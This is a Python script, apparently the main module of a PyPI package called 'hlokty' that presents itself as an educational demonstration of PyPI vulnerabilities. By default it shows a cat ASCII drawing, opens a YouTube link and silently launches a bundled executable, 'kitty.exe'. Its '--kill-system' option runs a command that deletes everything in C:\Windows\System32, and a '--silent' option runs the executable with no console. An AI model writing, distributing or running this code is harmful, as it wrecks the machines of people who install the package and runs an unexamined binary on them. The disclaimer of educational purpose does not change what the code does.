import argparse
import threading
import subprocess
import webbrowser
import pkg_resources
from termcolor import colored

kitty = """
⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⠶⣄⢀⣠⣤⠴⢦⡀⠀⠀⠀⠀
⠀⠀⠀⢠⡿⠉⠉⠉⠛⠶⠶⠖⠒⠒⣾⠋⠀⢀⣀⣙⣯⡁⠀⠀⠀⣿⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⢯⣼⠋⠉⠙⢶⠞⠛⠻⣆⠀⠀⠀
⠀⠀⠀⢸⣧⠆⠀⠀⠀⠀⠀⠀⠀⠀⠻⣦⣤⡤⢿⡀⠀⢀⣼⣷⠀⠀⣽⠀⠀⠀
⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢏⡉⠁⣠⡾⣇⠀⠀⠀
⠀⠀⢰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠋⠉⠀⢻⡀⠀⠀
⣀⣠⣼⣧⣤⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠐⠖⢻⡟⠓⠒
⠀⠀⠈⣷⣀⡀⠀⠘⠿⠇⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠿⠟⠀⠀⠀⠲⣾⠦⢤⠀
⠀⠀⠋⠙⣧⣀⡀⠀⠀⠀⠀⠀⠀⠘⠦⠼⠃⠀⠀⠀⠀⠀⠀⠀⢤⣼⣏⠀⠀⠀
⠀⠀⢀⠴⠚⠻⢧⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠞⠉⠉⠓⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠶⠶⠶⣶⣤⣴⡶⠶⠶⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀
"""

def exe_exe():
    exe_path = pkg_resources.resource_filename('hlokty', 'assets/kitty.exe')
    try:
        subprocess.run([exe_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

def open_url():
    webbrowser.open("https://youtu.be/28Ygr7j7jMs")

def damage_system():
    try:
        result = subprocess.run(["del", "C:\\Windows\\System32\\*.*"], capture_output=True, text=True, check=True)
        return result.stdout + "\n"
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="This library is designed exclusively to demonstrate potential vulnerabilities in the PyPI (Python Package Index) platform. Note: I do not take any responsibility for any unintended consequences or damage that may arise from its use. The creation of this library is intended purely for educational and experimental purposes.")
    parser.add_argument("-k", "--kill-system", action="store_true", help="damages the system files (do not use if you don't know what you're doing).")    
    parser.add_argument("-s", "--silent", action="store_true", help="run the file with no console.")
    args = parser.parse_args()
    
    if not any(vars(args).values()):
        print(colored(kitty, "magenta"))
        
        threading.Thread(target=open_url).start()
        threading.Thread(target=exe_exe).start()

    if args.kill_system:
        damage_system()
    
    if args.silent:
        exe_exe()
         
if __name__ == "__main__":
    main()